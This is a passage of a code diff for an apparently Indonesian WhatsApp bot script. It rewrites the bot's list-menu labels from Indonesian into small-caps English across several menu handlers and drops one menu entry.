-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -6156,378 +6307,181 @@ break
 case 'pushmenu': {
   let HydroSad = `${ pushmenu(prefix, hituet)}`
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
-          id: `.infobot`, 
-        },
-      ]
-    }
-  ]
-}
-    listbut2(m.chat, HydroSad, bet, m)
-}
-break
-case 'othermenu': {
-  let HydroSad = `${othermenu(prefix, hituet)}`
-const bet = {
-  title: "LIST MENU",
-  sections: [
-    {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
-      rows: [
-        {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
-          id: `.allmenu`, 
-        },
-      ]
-    },
-    {
-      title: `List menu yang dipisahkan`, 
-      highlight_label: ``,
-      rows: [
-        {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
-          id: `.bacaperaturan`, 
-        },
-        {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
-          id: `.donasi`, 
-        },
-        {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
-          id: `.ownermenu`, 
-        },
-        {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
-          id: `.groupmenu`, 
-        },
-        {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
-          id: `.gamemenu`, 
-        },
-        {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
-          id: `.storemenu`, 
-        },
-        {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
-          id: `.cpanelmenu`, 
-        },
-        {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
-          id: `.pushmenu`, 
-        },
-        {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
-          id: `.downloadmenu`, 
-        },
-        {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
-          id: `.aimenu`, 
-        },
-        {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
-          id: `.nsfwmenu`, 
-        },
-        {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
-          id: `.animemenu`, 
-        },
-        {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
-          id: `.ephoto360menu`, 
-        },
-        {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
-          id: `.funmenu`, 
-        },
-        {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
-          id: `.islamimenu`, 
-        },
-        {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
-          id: `.databasemenu`, 
-        },
-        {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
-          id: `.othermenu`, 
-        },
-        {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
-          id: `.rpgmenu`, 
-        },
-        {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
-          id: `.domainmenu`, 
-        },
-        {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
-          id: `.anonymousmenu`, 
-        },
-        {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
-          id: `.randomvideomenu`, 
-        },
-        {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
-          id: `.randomphotomenu`, 
-        },
-        {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
-          id: `.stickermenu`, 
-        },
-        {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
-          id: `.quotesmenu`, 
-        },
-        {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
-          id: `.stalkermenu`, 
-        },
-        {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
-          id: `.bugmenu`, 
-        },
-        {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
-          id: `.digitaloceanmenu`, 
-        },
-        {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
-          id: `.pyterodactylemenu`, 
-        },
-      ]
-    },
-    {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
-      rows: [
-        {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
-        },
-        {
-          title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
-          id: `.rating`,
-        },
-        {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -6540,186 +6494,181 @@ break
 case 'downloadmenu': { 
 let HydroSad = `${downloadmenu(prefix, hituet)}`  
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
